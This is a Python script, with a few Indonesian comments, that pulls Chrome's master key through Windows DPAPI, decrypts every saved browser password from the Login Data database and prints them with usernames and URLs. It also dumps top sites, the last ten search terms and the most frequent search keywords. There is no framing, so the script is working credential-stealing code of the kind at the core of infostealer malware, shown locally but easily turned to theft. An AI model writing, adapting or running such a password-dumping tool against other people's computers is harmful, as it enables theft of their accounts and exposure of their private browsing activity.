import os
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import json
import base64
import shutil
from datetime import datetime, timedelta
from tabulate import tabulate  # Untuk tampilan data dalam bentuk tabel

def get_chrome_master_key():
    local_state_path = os.path.join(
        os.environ['USERPROFILE'],
        'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State'
    )
    with open(local_state_path, 'r', encoding='utf-8') as file:
        local_state = json.loads(file.read())
    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]  # Remove 'DPAPI' prefix
    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return master_key

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        encrypted_password = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_password = cipher.decrypt(encrypted_password)[:-16].decode()  # Remove GCM tag
        return decrypted_password
    except Exception as e:
        print("Failed to decrypt password:", e)
        return ""

def get_chrome_passwords():
    db_path = os.path.join(
        os.environ['USERPROFILE'],
        'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'
    )
    db_copy = os.path.join(os.environ['USERPROFILE'], 'Login Data Copy')
    shutil.copyfile(db_path, db_copy)

    conn = sqlite3.connect(db_copy)
    cursor = conn.cursor()
    master_key = get_chrome_master_key()

    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

    passwords = []
    for row in cursor.fetchall():
        url = row[0]
        username = row[1]
        encrypted_password = row[2]
        decrypted_password = decrypt_password(encrypted_password, master_key)
        if username or decrypted_password:
            passwords.append([url, username, decrypted_password])

    cursor.close()
    conn.close()
    os.remove(db_copy)

    if passwords:
        print("Saved Passwords")
        print(tabulate(passwords, headers=["URL", "Username", "Password"], tablefmt="pretty"))
    else:
        print("No saved passwords found.")

def get_top_sites():
    db_path = os.path.join(
        os.environ['USERPROFILE'],
        'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Top Sites'
    )
    db_copy = os.path.join(os.environ['USERPROFILE'], 'Top Sites Copy')
    shutil.copyfile(db_path, db_copy)

    conn = sqlite3.connect(db_copy)
    cursor = conn.cursor()

    cursor.execute("SELECT url, title FROM top_sites")

    top_sites = []
    for row in cursor.fetchall():
        url = row[0]
        title = row[1]
        top_sites.append([title, url])

    cursor.close()
    conn.close()
    os.remove(db_copy)

    if top_sites:
        print("\nTop Sites")
        print(tabulate(top_sites, headers=["Title", "URL"], tablefmt="pretty"))
    else:
        print("No top sites found.")

# def get_last_5_history():
#     db_path = os.path.join(
#         os.environ['USERPROFILE'],
#         'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'History'
#     )
#     db_copy = os.path.join(os.environ['USERPROFILE'], 'History Copy')
#     shutil.copyfile(db_path, db_copy)

#     conn = sqlite3.connect(db_copy)
#     cursor = conn.cursor()

#     cursor.execute("""
#         SELECT url, title, visit_count, last_visit_time 
#         FROM urls 
#         ORDER BY last_visit_time DESC 
#         LIMIT 5
#     """)
#     history_entries = cursor.fetchall()

#     formatted_history = []
#     for row in history_entries:
#         url = row[0]
#         title = row[1]
#         visit_count = row[2]
#         last_visit_time = row[3]

#         last_visit_time = datetime(1601, 1, 1) + timedelta(microseconds=last_visit_time)
#         formatted_history.append({
#             "Title": title,
#             "URL": url,
#             "Visit Count": visit_count,
#             "Last Visited": last_visit_time.strftime('%Y-%m-%d %H:%M:%S')
#         })

#     cursor.close()
#     conn.close()
#     os.remove(db_copy)

#     # Display history in a simple format
#     if formatted_history:
#         print("\nLast 5 Browsing History Entries:")
#         print("="*35)
#         for i, entry in enumerate(formatted_history, start=1):
#             print(f"\nEntry {i}:")
#             print(f"Title       : {entry['Title']}")
#             print(f"URL         : {entry['URL']}")
#             print(f"Visit Count : {entry['Visit Count']}")
#             print(f"Last Visited: {entry['Last Visited']}")
#     else:
#         print("No browsing history found.")

def get_last_10_keywords():
    db_path = os.path.join(
        os.environ['USERPROFILE'],
        'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'History'
    )
    db_copy = os.path.join(os.environ['USERPROFILE'], 'History Copy')
    shutil.copyfile(db_path, db_copy)

    conn = sqlite3.connect(db_copy)
    cursor = conn.cursor()

    cursor.execute("""
        SELECT term FROM keyword_search_terms 
        ORDER BY ROWID DESC 
        LIMIT 10
    """)
    search_terms = cursor.fetchall()

    if search_terms:
        print("\nLast 10 Search Terms")
        print(tabulate(search_terms, headers=["Search Term"], tablefmt="pretty"))
    else:
        print("No search terms found.")

    cursor.close()
    conn.close()
    os.remove(db_copy)
    
def get_top_search_keywords():
    db_path = os.path.join(
        os.environ['USERPROFILE'],
        'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'History'
    )
    db_copy = os.path.join(os.environ['USERPROFILE'], 'History Copy')
    shutil.copyfile(db_path, db_copy)

    conn = sqlite3.connect(db_copy)
    cursor = conn.cursor()

    cursor.execute("""
        SELECT term, COUNT(term) as freq
        FROM keyword_search_terms
        GROUP BY term
        ORDER BY freq DESC
        LIMIT 5
    """)

    top_keywords = cursor.fetchall()

    if top_keywords:
        print("\nTop 5 Most Frequently Searched Keywords")
        print(tabulate(top_keywords, headers=["Keyword", "Frequency"], tablefmt="pretty"))
    else:
        print("No search terms found.")

    cursor.close()
    conn.close()
    os.remove(db_copy)

if __name__ == '__main__':
    print("""
    ⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣶⣶⣶⣶⣤⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀
    ⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀
    ⠀⢀⣾⣯⠻⣿⣿⣿⣿⡿⠟⠛⠉⠉⠛⠻⢿⣿⣿⣿⣿⣿⣿⣷⡀⠀
    ⠀⣾⣿⣿⣧⠈⠻⡿⠋⠀⠀⣀⣤⣤⣄⡀⠀⠈⠙⢿⣿⣿⣿⣿⣷⠀
    """)

    get_chrome_passwords()
    get_top_sites()
    # get_last_5_history()  # History dalam format daftar
    get_last_10_keywords()  # Search terms dalam tabel
    get_top_search_keywords()  # Top search keywords dalam tabel
